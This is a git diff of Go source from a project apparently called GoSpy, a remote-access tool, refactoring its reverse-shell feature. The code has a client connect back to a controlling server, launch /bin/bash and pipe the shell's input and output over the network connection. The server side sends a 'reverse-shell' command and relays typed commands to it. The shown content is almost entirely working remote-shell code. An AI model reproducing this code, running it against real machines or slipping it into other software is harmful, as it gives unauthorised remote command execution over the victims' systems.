@@ -5,16 +5,28 @@ import (
 	"fmt"
 	"github.com/psidex/GoSpy/internal/comms"
 	"github.com/psidex/GoSpy/internal/server/conman"
+	"io"
 	"log"
+	"net"
 	"os"
 	"os/exec"
 	"runtime"
 	"strings"
 )
 
+// goIoCopy runs io.Copy in a goroutine and passes the return values through the returned channel.
+func goIoCopy(dst io.Writer, src io.Reader) <-chan error {
+	errChan := make(chan error)
+	go func() {
+		_, err := io.Copy(dst, src)
+		errChan <- err
+	}()
+	return errChan
+}
+
 // initiateReverseShellOut initiates a reverse shell with the given connection.
-func initiateReverseShellOut(c comms.Connection) {
-	defer c.Close()
+func initiateReverseShellOut(conn net.Conn) {
+	defer conn.Close()
 	defer log.Println("Exited reverse shell function")
 
 	shellString := "/bin/bash"
@@ -39,8 +51,8 @@ func initiateReverseShellOut(c comms.Connection) {
 		return
 	}
 
-	cmdOutErr := c.GoReadFrom(cmdOut)
-	cmdInErr := c.GoWriteTo(cmdIn)
+	cmdOutErr := goIoCopy(conn, cmdOut)
+	cmdInErr := goIoCopy(cmdIn, conn)
 
 	err = cmd.Start()
 	if err != nil {
@@ -57,8 +69,8 @@ func initiateReverseShellOut(c comms.Connection) {
 }
 
 // ReverseShellReply starts a reverse shell from the current machine to the address of the given connection.
-func ReverseShellReply(c comms.Connection) error {
-	reverseShellConn, err := c.NewConnectionToRemote()
+func ReverseShellReply(cmdCon comms.Connection) error {
+	reverseShellConn, err := cmdCon.DialRemote()
 	if err != nil {
 		// For this to happen something must have gone wrong on the server (or the network dropped).
 		return err
@@ -70,23 +82,22 @@ func ReverseShellReply(c comms.Connection) error {
 
 // ReverseShellSend starts a reverse shell with the client.
 func ReverseShellSend(man conman.ConMan) (err error) {
-	err = man.CmdCon.SendBytes([]byte("reverse-shell"))
+	err = man.CmdCon.SendString("reverse-shell")
 	if err != nil {
 		return err
 	}
 
-	reverseShellConnection := man.WaitForNewConnection()
+	reverseShellConnection := man.AcceptSuccessful()
 	defer reverseShellConnection.Close()
 
 	fmt.Println("Type `exit` to leave the shell at any time")
-	_ = reverseShellConnection.GoWriteTo(os.Stdout)
+	goIoCopy(os.Stdout, reverseShellConnection)
 
 	for {
 		reader := bufio.NewReader(os.Stdin)
 		text, _ := reader.ReadString('\n')
 
-		textBytes := []byte(text)
-		err = reverseShellConnection.SendBytes(textBytes)
+		_, err = reverseShellConnection.Write([]byte(text))
 		if err != nil {
 			// Don't return the error because this is with the reverse shell connection, not with man.CmdCon.
 			fmt.Printf("Reverse shell connection error: %s\n", err.Error())
